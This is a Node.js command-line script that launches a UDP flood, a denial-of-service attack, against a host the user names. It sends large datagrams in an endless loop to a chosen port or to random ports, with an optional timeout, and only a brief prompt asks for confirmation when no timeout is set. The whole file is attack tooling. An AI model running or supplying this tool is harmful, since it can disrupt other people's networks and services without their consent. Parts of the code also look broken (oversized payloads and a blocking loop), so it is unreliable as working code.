var program = require('commander');

var programHelp = program
  .version('0.1.0')
  .option('-h, --host <host>', 'Host Name/IP')
  .option('-p, --port [port]', 'If not defined, program will use random ports.', parseInt)
  .option('-t, --timeout [timeout]', 'Timeout in millisecond. If not defined, it will be unlimited.', parseInt);

programHelp.parse(process.argv);

if (program.host) {

  if (!program.timeout) {
    program.confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ', function (ok) {
      if (!ok) {
        console.log('Ok, run program again with --timeout parameter.');
        process.stdin.destroy();
      } else {
        udpFlood(program.host, program.port);
      }
    });
  } else {
    udpFlood(program.host, program.port, program.timeout);
  }

} else {
  programHelp.help();
}

function udpFlood(host, port, timeout) {

  var HOST = host;
  var dgram = require('dgram');
  var client = dgram.createSocket('udp4');

  var output = "";
  for (var i = 65553; i >= 0; i--) {
    output += "X";
  };

  var startTime = new Date();
  while (1) {

    if (timeout) {
      var nowTime = new Date();
      if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
        break;
      }
    }

    var message = new Buffer(output);

    (function (PORT) {
      client.send(message, 0, message.length, PORT, HOST, function (err, bytes) {
        if (err) throw err;
        console.log('UDP message sent to ' + HOST + ':' + PORT);
      });
    })(port || Math.floor(Math.random() * (65553) + 1));
  };
}